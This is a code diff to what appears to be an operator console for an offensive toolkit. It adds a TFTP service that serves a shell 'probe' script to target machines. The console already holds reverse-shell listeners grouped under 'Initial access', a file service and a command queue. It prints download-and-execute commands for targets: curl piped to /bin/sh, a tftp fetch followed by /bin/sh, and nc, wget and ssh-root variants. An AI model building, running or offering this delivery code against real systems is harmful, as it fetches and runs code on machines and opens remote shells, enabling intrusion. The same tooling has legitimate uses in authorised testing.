@@ -967,6 +967,7 @@ DEFAULTS = {
     "bridge_dest_host": "127.0.0.1",
     "bridge_dest_port": 0,
     "GRIT_PROBE_PORT": 22207,
+    "GRIT_PROBE_TFTP_PORT": 22208,
     "GRIT_PROBE_NAME": "probe.sh",
     "operator_session_dir": str(DEFAULT_OPERATOR_SESSION_DIR),
     "server_state": str(DEFAULT_STATE_FILE),
@@ -7356,6 +7357,7 @@ def port_records_from_services(records):
         ports.append({
             "service": rec.get("name", ""),
             "port": port,
+            "protocol": rec.get("protocol", "tcp"),
             "bind_address": rec.get("bind_address", ""),
             "tls": rec.get("tls", False),
             "configured": rec.get("configured", ""),
@@ -11779,15 +11781,15 @@ def pid_is_managed_server(pid, cfg=None, rec=None):
     return bool(managed_server_evidence(pid, cfg=cfg, rec=rec))
 
 
-def proc_tcp_address(hexaddr, family):
+def proc_socket_address(hexaddr, family):
     try:
         raw = bytes.fromhex(hexaddr)
     except ValueError:
         return hexaddr
     try:
-        if family == "tcp":
+        if family in {"tcp", "udp"}:
             return socket.inet_ntop(socket.AF_INET, raw[::-1])
-        if family == "tcp6":
+        if family in {"tcp6", "udp6"}:
             # Linux /proc/net/tcp6 stores each 32-bit word little-endian.
             chunks = [raw[pos:pos + 4][::-1] for pos in range(0, len(raw), 4)]
             return socket.inet_ntop(socket.AF_INET6, b"".join(chunks))
@@ -11821,10 +11823,16 @@ def socket_inode_pids(inodes):
     return {inode: sorted(set(pids)) for inode, pids in found.items()}
 
 
-def listener_endpoints(port):
+def listener_endpoints(port, protocol="tcp"):
     entries = []
     target = f"{int(port):04X}"
-    for table, family in (("/proc/net/tcp", "tcp"), ("/proc/net/tcp6", "tcp6")):
+    if protocol == "udp":
+        tables = (("/proc/net/udp", "udp"), ("/proc/net/udp6", "udp6"))
+        listen_states = None
+    else:
+        tables = (("/proc/net/tcp", "tcp"), ("/proc/net/tcp6", "tcp6"))
+        listen_states = {"0A"}
+    for table, family in tables:
         path = Path(table)
         if not path.is_file():
             continue
@@ -11834,11 +11842,12 @@ def listener_endpoints(port):
             continue
         for line in lines:
             cols = line.split()
-            if len(cols) > 9 and cols[1].rsplit(":", 1)[-1].upper() == target and cols[3] == "0A":
+            if len(cols) > 9 and cols[1].rsplit(":", 1)[-1].upper() == target and (listen_states is None or cols[3] in listen_states):
                 host_hex, port_hex = cols[1].rsplit(":", 1)
                 entries.append({
                     "family": family,
-                    "address": proc_tcp_address(host_hex, family),
+                    "protocol": protocol,
+                    "address": proc_socket_address(host_hex, family),
                     "port": int(port_hex, 16),
                     "inode": cols[9],
                 })
@@ -11979,7 +11988,7 @@ def load_config(path):
     elif t == "builtin-tls":
         cfg["GRIT_RSHELL_TRANSPORT"] = "builtin"
         cfg.setdefault("GRIT_RSHELL_ENCRYPTION", "tls")
-    for key in ("ssh_listen_port", "GRIT_RSHELL_SOCAT_PORT", "GRIT_OPERATOR_REMOTE_FORWARD_PORT", "GRIT_OPERATOR_FILE_SERVICE_PORT", "bridge_listen_port", "bridge_dest_port", "GRIT_PROBE_PORT"):
+    for key in ("ssh_listen_port", "GRIT_RSHELL_SOCAT_PORT", "GRIT_OPERATOR_REMOTE_FORWARD_PORT", "GRIT_OPERATOR_FILE_SERVICE_PORT", "bridge_listen_port", "bridge_dest_port", "GRIT_PROBE_PORT", "GRIT_PROBE_TFTP_PORT"):
         cfg[key] = int(cfg[key])
     return cfg
 
@@ -14085,6 +14094,161 @@ def serve_probe(cfg, timeout, max_sessions=0):
     return 0
 
 
+def parse_tftp_rrq(packet):
+    if len(packet) < 4 or packet[:2] != b"\x00\x01":
+        return "", ""
+    parts = packet[2:].split(b"\0")
+    if len(parts) < 2:
+        return "", ""
+    try:
+        filename = parts[0].decode("utf-8", errors="replace").strip()
+        mode = parts[1].decode("ascii", errors="replace").strip().lower()
+    except UnicodeDecodeError:
+        return "", ""
+    return filename.lstrip("/"), mode
+
+
+def tftp_error_packet(code, message):
+    return b"\x00\x05" + int(code).to_bytes(2, "big") + str(message).encode("ascii", errors="replace") + b"\0"
+
+
+def tftp_data_packet(block, payload):
+    return b"\x00\x03" + int(block).to_bytes(2, "big") + payload
+
+
+def tftp_ack_block(packet):
+    if len(packet) >= 4 and packet[:2] == b"\x00\x04":
+        return int.from_bytes(packet[2:4], "big")
+    return -1
+
+
+def send_tftp_file(sock, addr, payload, timeout=3.0):
+    block = 1
+    offset = 0
+    sock.settimeout(timeout)
+    while True:
+        chunk = payload[offset:offset + 512]
+        packet = tftp_data_packet(block, chunk)
+        for _attempt in range(5):
+            sock.sendto(packet, addr)
+            try:
+                ack, ack_addr = sock.recvfrom(516)
+            except socket.timeout:
+                continue
+            if ack_addr == addr and tftp_ack_block(ack) == block:
+                break
+        else:
+            raise TimeoutError(f"timeout waiting for TFTP ACK block {block}")
+        offset += len(chunk)
+        if len(chunk) < 512:
+            return block
+        block = (block + 1) & 0xFFFF
+        if block == 0:
+            block = 1
+
+
+def render_probe_tftp_command(cfg, host=None, port=None):
+    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
+    safe_local_name = script_name.replace("'", "").replace("/", "_") or "probe.sh"
+    local_path = f"/tmp/{safe_local_name}"
+    candidates = local_ips()
+    direct_host = host or str(cfg.get("GRIT_OPERATOR_SERVER_HOST") or "") or (candidates[0] if candidates else "OPERATOR_IP")
+    direct_port = int(port or cfg.get("GRIT_PROBE_TFTP_PORT", 22208))
+    return f"tftp -g -r {shquote(script_name)} -l {shquote(local_path)} {shquote(direct_host)} {shquote(str(direct_port))} && /bin/sh {shquote(local_path)}"
+
+
+def serve_probe_tftp(cfg, timeout, max_sessions=0):
+    service = "probe-tftp"
+    port = int(cfg.get("GRIT_PROBE_TFTP_PORT", 22208))
+    host = str(cfg.get("GRIT_OPERATOR_SERVER_HOST") or "").strip()
+    if not host or host in ("0.0.0.0", "::", "127.0.0.1"):
+        candidates = local_ips()
+        host = candidates[0] if candidates else "OPERATOR_IP"
+    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
+    script_text = probe_script_fn(cfg, host, int(cfg.get("GRIT_PROBE_PORT", 22207)))
+    payload = script_text.encode("utf-8")
+    target_command = render_probe_tftp_command(cfg, host=host, port=port)
+    log_dir = session_log_dir(cfg, service)
+    session_details = {
+        "port": port,
+        "protocol": "udp",
+        "script_name": script_name,
+        "target_command": target_command,
+        "http_result_port": int(cfg.get("GRIT_PROBE_PORT", 22207)),
+    }
+    start_session_record(cfg, service, log_dir, details=session_details)
+    (log_dir / script_name).write_text(script_text, encoding="utf-8")
+    (log_dir / "config.json").write_text(json.dumps(cfg, indent=2) + "\n", encoding="utf-8")
+    print(f"Probe TFTP listener. Serving tftp://{host}:{port}/{script_name}")
+    print(f"Target command: {target_command}")
+    update_server_state(cfg, service, "starting", {"session_log": str(log_dir), **session_details})
+    sessions = 0
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.bind((str(cfg["listen_host"]), port))
+        register_socket(sock)
+        sock.settimeout(timeout)
+        update_server_state(cfg, service, "listening", {"session_log": str(log_dir), **session_details})
+        append_event(cfg, service, "service_start", session=str(log_dir), details=session_details)
+        while not SHUTDOWN.is_set():
+            try:
+                packet, addr = sock.recvfrom(516)
+            except socket.timeout:
+                print("timeout waiting for TFTP probe request", file=sys.stderr)
+                return 1 if sessions == 0 else 0
+            filename, mode = parse_tftp_rrq(packet)
+            remote = f"{addr[0]}:{addr[1]}"
+            if filename != script_name:
+                sock.sendto(tftp_error_packet(1, "file not found"), addr)
+                append_event(cfg, service, "probe_tftp_rejected", "warning", remote=remote, session=str(log_dir), details={
+                    "filename": filename,
+                    "mode": mode,
+                    "reason": "file-not-found",
+                })
+                continue
+            try:
+                blocks = send_tftp_file(sock, addr, payload)
+            except TimeoutError as exc:
+                append_event(cfg, service, "probe_tftp_error", "error", remote=remote, session=str(log_dir), details={
+                    "filename": filename,
+                    "mode": mode,
+                    "error": str(exc),
+                })
+                continue
+            sessions += 1
+            metadata = {
+                "operation": "probe_tftp_script",
+                "status": "served",
+                "remote_addr": remote,
+                "script_name": script_name,
+                "mode": mode,
+                "size": len(payload),
+                "blocks": blocks,
+            }
+            append_session_list_item(log_dir, "artifacts", metadata)
+            append_event(cfg, service, "probe_tftp_served", remote=remote, session=str(log_dir), details=metadata)
+            if max_sessions and sessions >= max_sessions:
+                return 0
+    except OSError as exc:
+        mark_service_error(cfg, service, exc, {"listen_host": str(cfg["listen_host"]), "port": port, "protocol": "udp"}, event_name="bind_error")
+        print(f"{service}: unable to bind UDP {cfg['listen_host']}:{port}: {exc}", file=sys.stderr)
+        raise
+    finally:
+        try:
+            unregister_socket(sock)
+            sock.close()
+        except OSError:
+            pass
+        stop_reason = SHUTDOWN_REASON or "server-exit"
+        if stop_reason != "bind_error":
+            mark_service_stopped(cfg, service, stop_reason)
+            finish_session_record(cfg, service, log_dir, state="ended", exit_reason=stop_reason)
+            record_shutdown_event(cfg, service, session=log_dir)
+            append_event(cfg, service, "service_stop", session=str(log_dir), details={"port": port, "protocol": "udp", "reason": stop_reason})
+    return 0
+
+
 def service_port(cfg, service):
     if service == "ssh":
         return int(cfg.get("ssh_listen_port", 22202))
@@ -14098,10 +14262,12 @@ def service_port(cfg, service):
         return int(cfg.get("bridge_listen_port", 22206))
     if service == "probe":
         return int(cfg.get("GRIT_PROBE_PORT", 22207))
+    if service == "probe-tftp":
+        return int(cfg.get("GRIT_PROBE_TFTP_PORT", 22208))
     return 0
 
 
-DAEMON_SERVICE_CHOICES = ("ssh", "tls-shell", "plain-shell", "file-service", "command-queue", "bridge", "probe")
+DAEMON_SERVICE_CHOICES = ("ssh", "tls-shell", "plain-shell", "file-service", "command-queue", "bridge", "probe", "probe-tftp")
 
 
 def configured_daemon_services(cfg, explicit=None):
@@ -14119,6 +14285,8 @@ def configured_daemon_services(cfg, explicit=None):
             services.append("bridge")
         if yes(cfg.get("probe_enable", "no")):
             services.append("probe")
+        if yes(cfg.get("probe_tftp_enable", "no")):
+            services.append("probe-tftp")
         if yes(cfg.get("rshell_enable", "no")):
             services.append(_resolve_transport(cfg, None))
     return list(dict.fromkeys(services))
@@ -14149,6 +14317,9 @@ def daemon_child_command(cfg, service):
         command.extend(["--bridge-dest-port", str(cfg.get("bridge_dest_port", 0))])
     if service == "probe":
         command.extend(["--probe-port", str(cfg.get("GRIT_PROBE_PORT", 22207))])
+        command.extend(["--probe-name", str(cfg.get("GRIT_PROBE_NAME", "probe.sh"))])
+    if service == "probe-tftp":
+        command.extend(["--probe-tftp-port", str(cfg.get("GRIT_PROBE_TFTP_PORT", 22208))])
         command.extend(["--probe-name", str(cfg.get("GRIT_PROBE_NAME", "probe.sh"))])
     command.extend(["--transport", service])
     command.extend(["--managed-by", "operator-daemon"])
@@ -14430,12 +14601,13 @@ def wait_service_port_released(cfg, service, pid=None, timeout=3.0):
             time.sleep(0.05)
         return not pid or not pid_alive(pid)
     deadline = time.time() + timeout
+    protocol = "udp" if service == "probe-tftp" else "tcp"
     while time.time() < deadline:
-        endpoints = listener_endpoints(port)
+        endpoints = listener_endpoints(port, protocol=protocol)
         if not endpoints:
             return True
         time.sleep(0.05)
-    return not listener_endpoints(port)
+    return not listener_endpoints(port, protocol=protocol)
 
 
 def _address_values(host):
@@ -14466,24 +14638,25 @@ def endpoint_matches_bind_address(bind_address, endpoint_address):
     return bool(bind_values & endpoint_values)
 
 
-def matching_listener_endpoints(host, port):
+def matching_listener_endpoints(host, port, protocol="tcp"):
     return [
-        endpoint for endpoint in listener_endpoints(port)
+        endpoint for endpoint in listener_endpoints(port, protocol=protocol)
         if endpoint_matches_bind_address(host, endpoint.get("address", ""))
     ]
 
 
-def port_listening(host, port):
-    return bool(matching_listener_endpoints(host, port))
+def port_listening(host, port, protocol="tcp"):
+    return bool(matching_listener_endpoints(host, port, protocol=protocol))
 
 
 def raw_service_snapshot(cfg):
     state = read_json_file(state_file_path(cfg), {"schema": 1, "services": {}})
     services = {}
-    for name in ("ssh", "tls-shell", "plain-shell", "file-service", "command-queue", "bridge", "probe"):
+    for name in ("ssh", "tls-shell", "plain-shell", "file-service", "command-queue", "bridge", "probe", "probe-tftp"):
         port = service_port(cfg, name)
         bind_address = str(cfg.get("listen_host", ""))
-        endpoints = listener_endpoints(port)
+        protocol = "udp" if name == "probe-tftp" else "tcp"
+        endpoints = listener_endpoints(port, protocol=protocol)
         matching_endpoints = [
             endpoint for endpoint in endpoints
             if endpoint_matches_bind_address(bind_address, endpoint.get("address", ""))
@@ -14492,6 +14665,7 @@ def raw_service_snapshot(cfg):
         matching_listener_pids = sorted({pid for endpoint in matching_endpoints for pid in endpoint.get("pids", [])})
         services[name] = {
             "port": port,
+            "protocol": protocol,
             "bind_address": bind_address,
             "listening": bool(matching_endpoints),
             "listener_endpoints": endpoints,
@@ -14567,6 +14741,7 @@ def service_status_rows(cfg):
         row = {
             "name": name,
             "port": info["port"],
+            "protocol": info.get("protocol", "tcp"),
             "bind_address": rec.get("listen_host") or info.get("bind_address") or str(cfg.get("listen_host", "")),
             "tls": service_tls_enabled(cfg, name),
             "actual": actual,
@@ -15893,6 +16068,7 @@ def status_document(cfg):
         row["name"]: {
             "name": row.get("name", ""),
             "port": row.get("port", 0),
+            "protocol": row.get("protocol", "tcp"),
             "bind_address": row.get("bind_address", ""),
             "tls": row.get("tls", False),
             "configured": row.get("configured", ""),
@@ -20350,6 +20526,12 @@ def service_start_headless_command(cfg, service, argv_extra=None):
     ]
     if service == "file-service":
         parts.extend(["--file-service-tls", str(cfg.get("GRIT_OPERATOR_FILE_SERVICE_TLS", "yes"))])
+    if service == "probe":
+        parts.extend(["--probe-port", str(cfg.get("GRIT_PROBE_PORT", 22207))])
+        parts.extend(["--probe-name", str(cfg.get("GRIT_PROBE_NAME", "probe.sh"))])
+    if service == "probe-tftp":
+        parts.extend(["--probe-tftp-port", str(cfg.get("GRIT_PROBE_TFTP_PORT", 22208))])
+        parts.extend(["--probe-name", str(cfg.get("GRIT_PROBE_NAME", "probe.sh"))])
     if argv_extra:
         parts.extend(str(item) for item in argv_extra)
     return " ".join(shquote(part) for part in parts)
@@ -20385,6 +20567,10 @@ def start_service_process(cfg, service, argv_extra=None, headless_command=""):
     cmd.extend(["--state-file", str(state_file_path(cfg)), "--staged-file", str(staged_file_path(cfg))])
     if service == "file-service":
         cmd.extend(["--file-service-tls", str(cfg.get("GRIT_OPERATOR_FILE_SERVICE_TLS", "yes"))])
+    if service == "probe":
+        cmd.extend(["--probe-port", str(cfg.get("GRIT_PROBE_PORT", 22207)), "--probe-name", str(cfg.get("GRIT_PROBE_NAME", "probe.sh"))])
+    if service == "probe-tftp":
+        cmd.extend(["--probe-tftp-port", str(cfg.get("GRIT_PROBE_TFTP_PORT", 22208)), "--probe-name", str(cfg.get("GRIT_PROBE_NAME", "probe.sh"))])
     if argv_extra:
         cmd.extend(argv_extra)
     log_root = Path(str(cfg.get("session_root", "local/sessions")))
@@ -22508,7 +22694,7 @@ def run_line_tui(cfg):
             port = rec.get("port") or "-" if rec else "-"
             pid = rec.get("pid") or "-" if rec else "-"
             print(f"  {service}  —  {actual}  |  :{port}  |  pid {pid}")
-            if service == "probe":
+            if service in {"probe", "probe-tftp"}:
                 _print_probe_delivery()
             else:
                 print("    options / start / stop / back")
@@ -22739,7 +22925,14 @@ def run_line_tui(cfg):
             ("GRIT_OPERATOR_SERVER_HOST",          "GRIT_OPERATOR_SERVER_HOST",       "operator IP for generated commands"),
         ],
         "probe": [
+            ("GRIT_PROBE_PORT",                    "GRIT_PROBE_PORT",                 "probe HTTP listen port"),
+            ("GRIT_PROBE_TFTP_PORT",               "GRIT_PROBE_TFTP_PORT",            "probe TFTP UDP listen port"),
             ("GRIT_OPERATOR_SERVER_HOST",          "GRIT_OPERATOR_SERVER_HOST",       "operator IP used in probe command"),
+        ],
+        "probe-tftp": [
+            ("GRIT_PROBE_TFTP_PORT",               "GRIT_PROBE_TFTP_PORT",            "probe TFTP UDP listen port"),
+            ("GRIT_PROBE_PORT",                    "GRIT_PROBE_PORT",                 "probe HTTP result upload port embedded in probe.sh"),
+            ("GRIT_OPERATOR_SERVER_HOST",          "GRIT_OPERATOR_SERVER_HOST",       "operator IP used in TFTP command"),
         ],
     }
     # Reverse lookup: grit env name → cfg_key (for use in set_line_option)
@@ -23430,7 +23623,7 @@ def run_line_tui(cfg):
 
         # Category grouping
         _CATEGORIES = [
-            ("Probe & discovery",  ["probe", "bridge"]),
+            ("Probe & discovery",  ["probe", "probe-tftp", "bridge"]),
             ("Initial access",     ["ssh", "tls-shell", "plain-shell"]),
             ("Post-deployment",    ["file-service", "command-queue"]),
         ]
@@ -23443,7 +23636,9 @@ def run_line_tui(cfg):
         def _bind(rec):
             host = rec.get("bind_address") or ""
             port = rec.get("port") or "-"
-            return f"{host}:{port}" if host else str(port)
+            proto = str(rec.get("protocol") or "tcp").upper()
+            bind = f"{host}:{port}" if host else str(port)
+            return f"{bind}/{proto}" if proto != "TCP" else bind
 
         def _status(rec):
             actual = rec.get("actual") or "-"
@@ -23552,6 +23747,7 @@ def run_line_tui(cfg):
         route_port = int(route.get("port", 22207) or 22207)
         url = f"http://{route_host}:{route_port}/{script_name}"
         curl_cmd = f"curl -fsSL {shquote(url)} | /bin/sh"
+        tftp_cmd = render_probe_tftp_command(cfg, host=route_host, port=cfg.get("GRIT_PROBE_TFTP_PORT", 22208))
         nc_cmd = (
             "printf 'GET /"
             + script_name.replace("'", "")
@@ -23568,12 +23764,13 @@ def run_line_tui(cfg):
         print("  Delivery options (pick what the target has):")
         print(f"    wget:  {wget_cmd}")
         print(f"    curl:  {curl_cmd}")
+        print(f"    tftp:  {tftp_cmd}")
         print(f"    nc:    {nc_cmd}")
         print(f"    ssh:   ssh root@target '{wget_cmd}'")
         print(f"    copy:  scp <(curl -s {shquote(url)}) root@target:/tmp/probe.sh && ssh root@target 'sh /tmp/probe.sh'")
         print("")
-        print("  Current listener: probe-http")
-        print("  Not yet served here: probe-tftp, probe-ftp, probe-dns")
+        print("  Current listeners: probe-http, probe-tftp")
+        print("  Not yet served here: probe-ftp, probe-dns")
         print("  If HTTP is blocked but nc works, use the nc command above against the same listener.")
         print("")
         print("  probe results  — after running any of the above")
@@ -23598,11 +23795,11 @@ def run_line_tui(cfg):
         cfg["_service_start_command"] = headless
         start_service_process(cfg, service, headless_command=headless)
         print("  copy start  — copy the headless start command")
-        if service == "probe":
+        if service in {"probe", "probe-tftp"}:
             # Brief poll for the listener to be ready, then show delivery commands
             for _ in range(10):
                 time.sleep(0.1)
-                if str((line_service_record("probe") or {}).get("actual") or "") == "listening":
+                if str((line_service_record(service) or {}).get("actual") or "") == "listening":
                     break
             _print_probe_delivery()
 
@@ -29731,6 +29928,7 @@ Common operator workflows:
   --save-bridge-profile NAME --bridge-port PORT --bridge-dest-host HOST --bridge-dest-port PORT
   --transport bridge --bridge-profile NAME
   --transport probe
+  --transport probe-tftp
 
 Interactive console:
   --tui opens the full-screen curses workbench for targets, mailbox work, files, bridges,
@@ -29855,7 +30053,8 @@ Transport modes:
   file-service — Receive-only TLS upload service for target-initiated files/evidence
   command-queue — Explicit command queue poll listener
   bridge      — Explicit TCP bridge from a local listener to a configured host:port
-  probe — Serve a /bin/sh probe script and receive its result
+  probe — Serve a /bin/sh probe script over HTTP and receive its result
+  probe-tftp — Serve the same probe script over UDP TFTP for first-contact fallback
 
 File staging:
   --transport file-service --serve-file ./tool --as /tmp/tool
@@ -29893,7 +30092,7 @@ Aliases accepted: ssh-reverse=ssh, socat-tls=tls-shell, builtin-tls=tls-shell
                         help="griTTYkit shell build config used by scripts/menuconfig and make package")
     parser.add_argument("--transport",
                         choices=("ssh", "ssh-reverse", "tls-shell", "socat-tls",
-                                 "builtin-tls", "plain-shell", "file-service", "command-queue", "bridge", "probe"),
+                                 "builtin-tls", "plain-shell", "file-service", "command-queue", "bridge", "probe", "probe-tftp"),
                         help="transport to listen for (overrides config)")
     parser.add_argument("--file-service", action="store_true",
                         help="receive target-initiated file uploads and store them under local/sessions")
@@ -30104,6 +30303,8 @@ Aliases accepted: ssh-reverse=ssh, socat-tls=tls-shell, builtin-tls=tls-shell
                         help="print named bridge profiles as JSON")
     parser.add_argument("--probe-port", type=int,
                         help="probe HTTP listener port")
+    parser.add_argument("--probe-tftp-port", type=int,
+                        help="probe TFTP UDP listener port")
     parser.add_argument("--probe-name",
                         help="probe script filename, default probe.sh")
     parser.add_argument("--file-service-tls", choices=("yes", "no"),
@@ -30163,6 +30364,8 @@ Aliases accepted: ssh-reverse=ssh, socat-tls=tls-shell, builtin-tls=tls-shell
         cfg["bridge_dest_port"] = args.bridge_dest_port
     if args.probe_port:
         cfg["GRIT_PROBE_PORT"] = args.probe_port
+    if args.probe_tftp_port:
+        cfg["GRIT_PROBE_TFTP_PORT"] = args.probe_tftp_port
     if args.probe_name:
         cfg["GRIT_PROBE_NAME"] = args.probe_name
     if args.file_service_tls:
@@ -30513,6 +30716,8 @@ Aliases accepted: ssh-reverse=ssh, socat-tls=tls-shell, builtin-tls=tls-shell
                                 session_timeout=session_timeout)
         if action == "probe":
             return serve_probe(cfg, timeout, max_sessions=1 if args.one_shot else 0)
+        if action == "probe-tftp":
+            return serve_probe_tftp(cfg, timeout, max_sessions=1 if args.one_shot else 0)
     except KeyboardInterrupt:
         print("grit-console: interrupted, shutting down", file=sys.stderr)
         request_shutdown("keyboard_interrupt")
